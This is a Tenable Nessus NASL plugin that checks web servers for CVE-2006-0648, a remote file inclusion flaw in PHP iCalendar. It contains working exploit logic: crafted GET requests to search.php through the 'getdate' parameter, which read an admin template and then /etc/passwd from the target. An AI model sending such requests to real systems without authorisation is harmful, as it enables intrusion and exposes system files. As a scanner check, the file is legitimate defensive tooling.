#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(20867);
  script_version("1.22");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2006-0648");
  script_bugtraq_id(16557);

  script_name(english:"PHP iCalendar Multiple Script Remote File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to remote file inclusion attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running PHP iCalendar, a web-based iCal
file viewer / parser written in PHP. 

The installed version of PHP iCalendar fails to validate user input to
the 'getdate' parameter of the 'search.php' script as well as the
'file' parameter of 'template.php' script.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker can
leverage these flaws to view arbitrary files on the remote host and
execute arbitrary PHP code, possibly taken from third-party hosts.");
  script_set_attribute(attribute:"see_also", value:"http://evuln.com/labs/advisories/70/");
  script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting or modify the code as
described in the advisory above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/02/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/02/09");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:php_icalendar:php_icalendar");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

global_var	port;

port = get_http_port(default:80, embedded: 0, php: 1);


# A function to actually read a file.
function exploit(dir, file) {
  local_var r;

  r = http_send_recv3(method: "GET", port: port,
    exit_on_fail: 1,
    item:string(dir, "/search.php?","getdate=", file), 
    add_headers: make_array("Referer", SCRIPT_NAME));
  return r[2];
}


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/icalendar", "/phpicalendar", "/calendar", "/ical", "/cal", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  res = exploit(dir:dir, file:"./templates/default/admin.tpl");
  if (res == NULL) exit(0);

  # There's a problem if it looks like the admin template.
  if (egrep(pattern:"\{(HEADER|L_LOGOUT|L_ADMIN_HEADER)\}", string:res)) {
    # Try to exploit it to read /etc/passwd for the report.
    res2 = exploit(dir:dir, file:"/etc/passwd");
    if (res2) {
      contents = strstr(res2, "getdate=");
      if (contents) contents = contents - strstr(contents, '"><img src="templates/default/images/day_on.gif');
      if (contents) contents = contents - "getdate=";
    }

    if (isnull(contents)) security_warning(port);
    else {
      contents = data_protection::redact_etc_passwd(output:contents);
      report = string(
        "\n",
        "Here is the /etc/passwd file that Nessus read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }

    exit(0);
  }
}
